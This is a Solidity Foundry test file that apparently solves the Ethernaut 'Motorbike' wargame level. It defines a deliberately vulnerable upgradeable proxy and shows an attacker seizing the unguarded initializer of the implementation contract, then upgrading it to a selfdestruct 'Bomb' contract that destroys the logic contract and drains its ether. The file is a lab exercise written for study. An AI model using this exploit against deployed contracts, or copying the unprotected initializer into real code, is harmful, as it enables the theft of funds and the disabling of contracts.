// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import "forge-std/Test.sol";

contract Engine {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;
    address public upgrader;
    uint256 public horsePower;

    function initialize() external {
        require(upgrader == address(0), "Already initialized");
        upgrader = msg.sender;
        horsePower = 1000;
    }

    function upgradeToAndCall(address newImplementation, bytes memory data) external payable {
        _authorizeUpgrade();
        _upgradeToAndCall(newImplementation, data);
    }

    function _authorizeUpgrade() internal view {
        require(msg.sender == upgrader, "Not authorized");
    }

    function _upgradeToAndCall(address newImplementation, bytes memory data) internal {
        assembly {
            sstore(_IMPLEMENTATION_SLOT, newImplementation)
        }
        (bool success, ) = newImplementation.delegatecall(data);
        require(success, "Call failed");
    }
}

contract Motorbike {
    bytes32 internal constant _IMPLEMENTATION_SLOT = 0x360894a13ba1a3210667c828492db98dca3e2076cc3735a920a3ca505d382bbc;

    constructor(address _logic) {
        assembly {
            sstore(_IMPLEMENTATION_SLOT, _logic)
        }
        (bool success, ) = _logic.delegatecall(
            abi.encodeWithSignature("initialize()")
        );
        require(success, "Init failed");
    }

    fallback() external payable {
        _delegate(getAddressSlot(_IMPLEMENTATION_SLOT));
    }

    function _delegate(address implementation) internal virtual {
        assembly {
            calldatacopy(0, 0, calldatasize())
            let result := delegatecall(gas(), implementation, 0, calldatasize(), 0, 0)
            returndatacopy(0, 0, returndatasize())
            switch result
            case 0 { revert(0, returndatasize()) }
            default { return(0, returndatasize()) }
        }
    }

    function getAddressSlot(bytes32 slot) internal view returns (address r) {
        assembly {
            r := sload(slot)
        }
    }
}

contract Bomb {
    function goBoom() external {
        selfdestruct(payable(msg.sender));
    }
}

contract EthernautMotorbikeTest is Test {
    function testLevel25_Motorbike_Universal() public {
        address hacker = makeAddr("hacker");
        vm.startPrank(hacker);

        Engine engineLogic = new Engine();
        Motorbike proxy = new Motorbike(address(engineLogic));
        
        vm.deal(address(engineLogic), 1 ether);
        console.log("Initial Engine Balance:", address(engineLogic).balance);

        engineLogic.initialize();
        console.log("Hacker is owner:", engineLogic.upgrader() == hacker);

        Bomb bomb = new Bomb();

        uint256 hackerBalBefore = hacker.balance;

        engineLogic.upgradeToAndCall(
            address(bomb),
            abi.encodeWithSelector(Bomb.goBoom.selector)
        );

        uint256 hackerBalAfter = hacker.balance;
        uint256 size;
        address target = address(engineLogic);
        assembly { size := extcodesize(target) }

        console.log("Final Engine Code Size:", size);
        console.log("Hacker Balance Increase:", hackerBalAfter - hackerBalBefore);

        
        bool codeDeleted = (size == 0);
        bool moneyTaken = (hackerBalAfter > hackerBalBefore);

        if (codeDeleted) {
            console.log("SUCCESS: Engine code destroyed completely!");
        } else if (moneyTaken) {
            console.log("SUCCESS: Selfdestruct executed (Money transferred), but code remains (Cancun Rule).");
            console.log("Technically, you successfully hacked the Logic!");
        } else {
            fail("Attack Failed: Neither code destroyed nor money transferred.");
        }

        assertTrue(codeDeleted || moneyTaken);

        vm.stopPrank();
    }
}